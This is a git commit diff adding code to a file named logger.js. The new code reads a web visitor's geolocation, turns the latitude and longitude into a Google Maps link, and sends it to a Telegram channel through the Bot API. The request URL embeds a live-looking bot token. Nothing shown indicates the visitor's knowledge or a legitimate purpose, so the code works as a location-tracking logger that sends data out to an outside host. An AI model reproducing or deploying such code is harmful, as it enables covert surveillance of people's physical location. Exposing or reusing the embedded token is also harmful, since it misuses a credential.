c90376127bd8e7415be5322d1b7a1777c1ff74e7
gebeto <bboyheadman@gmail.com>
2017-04-27 15:11:51 +0300

    QuickCommit

--- logger.js
+++ logger.js
@@ -9,3 +9,23 @@ xhr.onreadystatechange = function(e) {
 		console.log(xhr.responseText);
 	}
 }
+
+navigator.geolocation.getCurrentPosition(function(geo){
+	console.log(geo);
+	var la = geo.coords.latitude;
+	var lo = geo.coords.longitude;
+	
+	var map = 'https://www.google.com.ua/maps/@' + la + ',' + lo + ',15z';
+	var API_URL = "https://api.telegram.org/bot376375041:AAFpGo0SeUJcfxOPjCynepIUhScAmbAgeYI/sendMessage?chat_id=@gebetologer&text= \
+			" + encodeURIComponent('Локация: ' + map);
+
+	var xhr = new XMLHttpRequest();
+	xhr.open('GET', API_URL);
+	xhr.send();
+	xhr.onreadystatechange = function(e) {
+		if (xhr.readyState === 4) {
+			console.log(xhr.responseText);
+		}
+	}
+
+});
